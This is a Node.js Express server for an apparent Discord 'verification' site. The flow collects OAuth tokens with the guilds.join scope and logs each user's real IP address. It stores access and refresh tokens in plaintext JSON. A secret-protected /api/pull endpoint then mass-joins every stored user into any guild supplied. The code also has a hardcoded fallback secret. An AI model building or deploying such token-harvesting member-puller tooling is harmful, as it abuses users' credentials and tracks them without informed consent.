const express = require('express');
const fs = require('fs');
const path = require('path');

// --- Load .env manually ---
try {
  const envFile = fs.readFileSync('.env', 'utf-8');
  for (const line of envFile.split('\n')) {
    const [key, ...rest] = line.split('=');
    if (key && rest.length) process.env[key.trim()] = rest.join('=').trim();
  }
} catch (e) {}

const app = express();
app.use(express.json());

const DB_FILE = './verified-users.json';
const PORT = process.env.AUTH_PORT || 3000;

// ---- Discord OAuth2 config (set these in .env) ----
const CLIENT_ID     = process.env.DISCORD_CLIENT_ID;
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const REDIRECT_URI  = process.env.OAUTH_REDIRECT_URI; // e.g. https://yourdomain.com/callback
const BOT_TOKEN     = process.env.DISCORD_TOKEN;

// ---- Secret key for pull/admin endpoints ----
// Change this to your own long secret before deploying
const PULL_SECRET = process.env.PULL_SECRET || 'illegal-rest-s3cr3t-k3y-change-this-xK9mP2qL8vN4wR7';

// ---- DB helpers ----
function loadDb() {
  if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ verified: {}, unverified: {} }, null, 2));
  return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
}

function saveDb(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

// ---- Serve the verify website ----
app.use(express.static(path.join(__dirname, 'website')));
app.use(express.static(path.join(process.cwd(), 'website')));

app.get('/', (req, res) => {
  const p1 = path.join(__dirname, 'website', 'index.html');
  const p2 = path.join(process.cwd(), 'website', 'index.html');
  if (fs.existsSync(p1)) return res.sendFile(p1);
  if (fs.existsSync(p2)) return res.sendFile(p2);
  res.send('website folder not found - looked in: ' + p1 + ' and ' + p2);
});

// ---- Step 1: redirect to Discord OAuth ----
app.get('/auth', (req, res) => {
  const params = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    response_type: 'code',
    scope: 'identify guilds.join',
  });
  res.redirect('https://discord.com/oauth2/authorize?' + params.toString());
});

// ---- Step 2: OAuth2 callback ----
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.status(400).send('Missing code.');

  // Get real IP
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

  try {
    // Exchange code for token
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: REDIRECT_URI,
      }),
    });
    const tokenData = await tokenRes.json();

    if (!tokenData.access_token) {
      console.error('Token exchange failed:', tokenData);
      return res.status(500).send('OAuth failed.');
    }

    // Fetch user info
    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { Authorization: 'Bearer ' + tokenData.access_token },
    });
    const user = await userRes.json();

    if (!user.id) return res.status(500).send('Could not fetch user.');

    // Store in DB
    const db = loadDb();
    db.verified[user.id] = {
      id: user.id,
      username: user.username,
      discriminator: user.discriminator || '0',
      access_token: tokenData.access_token,
      refresh_token: tokenData.refresh_token,
      token_type: tokenData.token_type,
      scope: tokenData.scope,
      ip: ip,
      timestamp: new Date().toISOString(),
    };
    // Remove from unverified if present
    delete db.unverified[user.id];
    saveDb(db);

    console.log('[Auth] Verified:', user.username, '| IP:', ip);

    // Redirect back to website with success state
    res.redirect('/?verified=1');
  } catch (err) {
    console.error('[Auth callback error]', err);
    res.status(500).send('Internal error.');
  }
});

// ---- API: get all verified users (requires PULL_SECRET) ----
app.get('/api/verified', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const db = loadDb();
  res.json(db.verified);
});

// ---- API: get all unverified users (requires PULL_SECRET) ----
app.get('/api/unverified', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const db = loadDb();
  res.json(db.unverified);
});

// ---- API: pull users into a guild (requires PULL_SECRET) ----
app.post('/api/pull', async (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const { guildId } = req.body;
  if (!guildId) return res.status(400).json({ error: 'Missing guildId' });

  const db = loadDb();
  const users = Object.values(db.verified);
  let success = 0;
  let fail = 0;

  for (const user of users) {
    if (!user.access_token) { fail++; continue; }
    try {
      const pullRes = await fetch(`https://discord.com/api/guilds/${guildId}/members/${user.id}`, {
        method: 'PUT',
        headers: {
          Authorization: 'Bot ' + BOT_TOKEN,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ access_token: user.access_token }),
      });
      if (pullRes.status === 201 || pullRes.status === 204 || pullRes.status === 200) {
        success++;
      } else {
        const err = await pullRes.json().catch(() => ({}));
        console.warn('[Pull] Failed for', user.username, pullRes.status, err);
        fail++;
      }
    } catch (e) {
      console.error('[Pull error]', e);
      fail++;
    }
    await new Promise(r => setTimeout(r, 600));
  }

  res.json({ success, fail, total: users.length });
});

// ---- API: add unverified member (called by bot) ----
app.post('/api/unverified', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const { id, username } = req.body;
  if (!id) return res.status(400).json({ error: 'Missing id' });
  const db = loadDb();
  if (!db.verified[id]) {
    db.unverified[id] = { id, username: username || 'Unknown', timestamp: new Date().toISOString() };
    saveDb(db);
  }
  res.json({ ok: true });
});

// ---- API: check a specific user ----
app.get('/api/check/:userId', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const db = loadDb();
  const v = db.verified[req.params.userId];
  const u = db.unverified[req.params.userId];
  if (v) return res.json({ status: 'verified', ...v });
  if (u) return res.json({ status: 'unverified', ...u });
  return res.json({ status: 'unknown' });
});

app.listen(PORT, () => {
  console.log('[Auth Server] Running on port ' + PORT);
});

module.exports = app;
